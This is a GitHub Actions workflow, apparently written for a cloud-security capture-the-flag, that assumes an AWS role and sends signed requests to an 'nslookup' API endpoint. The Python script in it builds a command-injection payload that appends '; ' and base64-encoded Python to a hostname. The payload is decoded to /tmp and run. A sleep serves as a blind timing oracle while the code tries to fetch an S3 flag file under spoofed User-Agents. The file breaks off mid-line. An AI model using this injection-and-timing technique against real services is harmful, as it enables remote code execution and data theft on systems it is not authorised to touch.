name: Stage2-22-Unsigned-S3-Corrected

on:
  push:
    branches:
      - corgi

permissions:
  contents: read
  id-token: write

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Install dependencies
        run: |
          python3 -m pip install requests requests-aws4auth --quiet

      - name: Test unsigned S3 requests
        run: |
          python3 - <<'PY'
          import os
          import time
          import base64
          import requests
          from requests_aws4auth import AWS4Auth

          api = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"

          auth = AWS4Auth(
              os.environ["AWS_ACCESS_KEY_ID"],
              os.environ["AWS_SECRET_ACCESS_KEY"],
              "us-east-1",
              "execute-api",
              session_token=os.environ["AWS_SESSION_TOKEN"]
          )

          user_agents = [
              "Amazon CloudFront",
              "CloudFront",
              "Mozilla/5.0",
              "nslookupv2",
              "nslookup",
              "AWSLambda",
              "lambdaRole",
              "CloudEscape",
              "corgi",
              "REDACTED",
              "python-urllib"
          ]

          for user_agent in user_agents:
              inner_code = (
                  "import urllib.request\n"
                  "url='https://s3.us-east-1.amazonaws.com/"
                  "logad88e2b168aa387e/flag.txt'\n"
                  f"req=urllib.request.Request(url, headers={{'User-Agent': {user_agent!r}}})\n"
                  "with urllib.request.urlopen(req, timeout=10) as r:\n"
                  "    r.read(1)\n"
              )

              encoded = base64.b64encode(inner_code.encode()).decode()

              injected = (
                  "example.com; "
                  "printf '%s' "
                  + encoded
                  + " | base64 -d > /tmp/unsigned_probe.py; "
                  "python3 /tmp/unsigned_probe.py "
                  ">/tmp/unsigned_result 2>&1 && sleep 8"
              )

              start = time.monot
